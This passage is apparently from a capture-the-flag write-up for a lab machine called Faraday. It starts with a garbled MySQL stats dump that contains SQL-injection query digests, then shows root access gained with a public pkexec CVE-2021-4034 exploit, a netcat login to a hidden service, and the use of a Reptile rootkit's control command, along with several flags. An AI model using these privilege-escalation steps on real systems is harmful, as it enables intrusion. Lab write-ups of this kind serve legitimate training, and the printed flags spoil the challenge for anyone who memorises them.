ms545024444441796442.32 s10full_scanshostlock_latencymax_latencyrows_affectedrows_examinedrows_sentstatementtotaltotal_latency5717444417localhost39164975242773524730000001139718006600010617149365362625537125570update521784444176518003814545455144556371515537572558671257730000localhost09058031000000flush190580310000localhost01393769000000error34477380390000000localhost0897252000000Quit570696444151501745404266253632353445652730000localhost06415673000000Ping1641567300011avg_tmp_tables_per_querydbdigestdisk_tmp_tablesexec_countfirst_seenlast_seenmemory_tmp_tablesquerytmp_tables_to_disk_pcttotal_latency1211challenge2a2cfa43bf81f081216860d5e423bdd4e0c4e6273e365504c7f13b0263d7043e082021-07-19 07:57:53.8283412021-07-19 08:06:28.7258318UPDATE `search` SET `keyword` = ? AND ? = ( SELECT ( CASE WHEN ( ? = ? ) THEN ? ELSE ( SELECT ? UNION SELECT ? ) END ) )040217590001challengeb32be1a057176f18ee3a7558a6f38e246f367017d8856bf80366f8b55eaef63f042021-07-19 07:57:53.8855142021-07-19 08:06:28.7614094UPDATE `search` SET `keyword` = ? WHERE ? = ? AND ? = ( SELECT ( CASE WHEN ( ? = ? ) THEN ? ELSE ( SELECT ? UNI3idkeywordmessage101pythonpowered by linux2pythonThere are two major products that came out of Berkeley: LSD and UNIX. We don't believe this to be a coincidence.3pythonThere's nobody getting rich writing software that I know of.4python640K ought to be enough for anybody.5pythonMost hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker.6pythonDid you ever play tic-tac-toe?.7pythonFARADAY{@cc3ss_10gz_c4n_b3_use3fu111}8pythonListen to me, Coppertop. We don't have time for 20 Questions.9pythonI hate the administrator too.10pythonRethink vulnerability management.
```

We can get the flag of them `FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}`

# Privilege escalation
Let's check `sudo -l` firstly
```
-bash-5.0$ sudo -l
[sudo] password for administrator: 
Sorry, user administrator may not run sudo on erlenmeyer.
```

Continue to check files with `suid` permissions
```
-bash-5.0$ find / -perm -4000 2>/dev/null | grep -v snap
/usr/bin/umount
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/bash
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```

Very typical `pkexec` vulnerable
```
-bash-5.0$ ls -al /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
-bash-5.0$ file /usr/bin/pkexec
/usr/bin/pkexec: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=81dfad0b2cd8c2bb03db266cb98ca59931c530f9, for GNU/Linux 3.2.0, stripped
```

CVE-2021-4034
```
https://github.com/joeammond/CVE-2021-4034.git
```

After run the exploit script, you can get the root shell easily
```
-bash-5.0$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1000(administrator) groups=1000(administrator)
# whoami
root
# cd /root
# ls
access.log  chkrootkit.txt  exploitme  flag.txt  snap  web
# cat flag.txt
FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}

```

# Hidden pasta
Remember the port 8888, we never check it. Let's use `nc`to connect it.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Faraday/CVE-2021-4034]
└─$ nc 10.13.37.14 8888        
Welcome to FaradaySEC stats!!!
Username: pasta
Password: antihacker
access granted!!!
FARADAY{C_1s-0ld-Bu7_n0t-0bs0|3te} 
```

# Root Kit
We can find a file called `chkrootkit.txt` from `/root`
```
root@erlenmeyer:~# cat chkrootkit.txt
Checking `amd'...                                           not found
Checking `biff'...                                          not found
Checking `fingerd'...                                       not found
Checking `gpm'...                                           not found
Checking `inetdconf'...                                     not found
Checking `identd'...                                        not found
Checking `mingetty'...                                      not found
Checking `named'...                                         not found
Checking `pop2'...                                          not found
Checking `pop3'...                                          not found
Checking `rpcinfo'...                                       not found
Checking `rlogind'...                                       not found
Checking `rshd'...                                          not found
Checking `sshd'...                                          not found
Checking `tcpd'...                                          not found
Checking `telnetd'...                                       not found
Checking `timed'...                                         not found
Checking `traceroute'...                                    not found
Searching for sniffer's logs, it may take a while...        nothing found
Searching for rootkit HiDrootkit's default files...         nothing found
Searching for rootkit t0rn's default files...               nothing found
Searching for t0rn's v8 defaults...                         nothing found
Searching for rootkit Lion's default files...               nothing found
Searching for rootkit RSHA's default files...               nothing found
Searching for rootkit RH-Sharpe's default files...          nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... The following suspicious files and directories were found:  
Searching for LPD Worm files and dirs...                    nothing found
Searching for Ramen Worm files and dirs...                  nothing found
Searching for Maniac files and dirs...                      nothing found
Searching for RK17 files and dirs...                        nothing found
Searching for Ducoci rootkit...                             nothing found
Searching for Adore Worm...                                 nothing found
Searching for ShitC Worm...                                 nothing found
Searching for Omega Worm...                                 nothing found
Searching for Sadmind/IIS Worm...                           nothing found
Searching for MonKit...                                     nothing found
Searching for Showtee...                                    nothing found
Searching for OpticKit...                                   nothing found
Searching for T.R.K...                                      nothing found
Searching for Mithra...                                     nothing found
Searching for LOC rootkit...                                nothing found
Searching for Romanian rootkit...                           nothing found
Searching for Suckit rootkit...                             nothing found
Searching for Volc rootkit...                               nothing found
Searching for Gold2 rootkit...                              nothing found
Searching for TC2 Worm default files and dirs...            nothing found
Searching for Anonoying rootkit default files and dirs...   nothing found
Searching for ZK rootkit default files and dirs...          nothing found
Searching for ShKit rootkit default files and dirs...       nothing found
Searching for AjaKit rootkit default files and dirs...      nothing found
Searching for zaRwT rootkit default files and dirs...       nothing found
Searching for Madalin rootkit default files...              nothing found
Searching for Fu rootkit default files...                   nothing found
Searching for ESRK rootkit default files...                 nothing found
Searching for rootedoor...                                  nothing found
Searching for Reptile Rootkit...                            found it
Searching for ENYELKM rootkit default files...              nothing found
Searching for common ssh-scanners default files...          nothing found
Searching for Linux/Ebury - Operation Windigo ssh...        nothing found 
Searching for 64-bit Linux Rootkit ...                      nothing found
Searching for 64-bit Linux Rootkit modules...               nothing found
Searching for Mumblehard Linux ...                          nothing found
Searching for Backdoor.Linux.Mokes.a ...                    nothing found
Searching for Malicious TinyDNS ...                         nothing found
Searching for Linux.Xor.DDoS ...                            nothing found
Searching for Linux.Proxy.1.0 ...                           nothing found
Searching for CrossRAT ...                                  nothing found
Searching for Hidden Cobra ...                              nothing found
Searching for Rocke Miner ...                               nothing found
Searching for suspect PHP files...                          nothing found
Searching for anomalies in shell history files...           nothing found
Checking `rexedcs'...                                       not found
root@erlenmeyer:~#
```
This appears to be the output of `chkrootkit`, which shows us the presence of the Reptile rootkit on this machine.

Let's check where is `reptileRoberto`
```
# ls -al /
total 84
drwxr-xr-x  21 root root  4096 Sep 14  2021 .
drwxr-xr-x  21 root root  4096 Sep 14  2021 ..
-rw-------   1 root root    21 Sep 14  2021 .bash_history
lrwxrwxrwx   1 root root     7 Feb  1  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 16  2021 boot
drwxr-xr-x   2 root root  4096 Jul 16  2021 cdrom
drwxr-xr-x  18 root root  4000 Jul 30 03:41 dev
drwxr-xr-x  97 root root  4096 Sep 14  2021 etc
drwxr-xr-x   5 root root  4096 Jul 20  2021 home
lrwxrwxrwx   1 root root     7 Feb  1  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb  1  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Jul 16  2021 lost+found
drwxr-xr-x   2 root root  4096 Feb  1  2021 media
drwxr-xr-x   3 root root  4096 Jul 16  2021 mnt
drwxr-xr-x   2 root root  4096 Feb  1  2021 opt
dr-xr-xr-x 301 root root     0 Jul 28 07:40 proc
drwxr-xr-x   2 root root  4096 Jul 20  2021 reptileRoberto
drwx------   7 root root  4096 Sep 14  2021 root
drwxr-xr-x  28 root root   900 Jul 31 09:18 run
lrwxrwxrwx   1 root root     8 Feb  1  2021 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Jul 16  2021 snap
drwxr-xr-x   2 root root  4096 Feb  1  2021 srv
dr-xr-xr-x  13 root root     0 Jul 28 07:40 sys
drwxrwxrwt  14 root root  4096 Jul 31 09:05 tmp
drwxr-xr-x  14 root root  4096 Feb  1  2021 usr
drwxr-xr-x  13 root root  4096 Feb  1  2021 var
```

Then you can use `_cmd` with show as an argument to temporarily disable the rootkit and be able to view `ocultos` files and directories.
```
# cd /reptileRoberto
# ls
reptileRoberto  reptileRoberto_cmd  reptileRoberto_flag.txt  reptileRoberto_rc  reptileRoberto_shell  reptileRoberto_start
# cat reptileRoberto_flag.txt
FARADAY{__LKM-is-a-l0t-l1k3-an-0r@ng3__}
```

# Description
Another `CTF` category machine, if you really into `CTFs` and Cryptography, this is your type, not mine. :)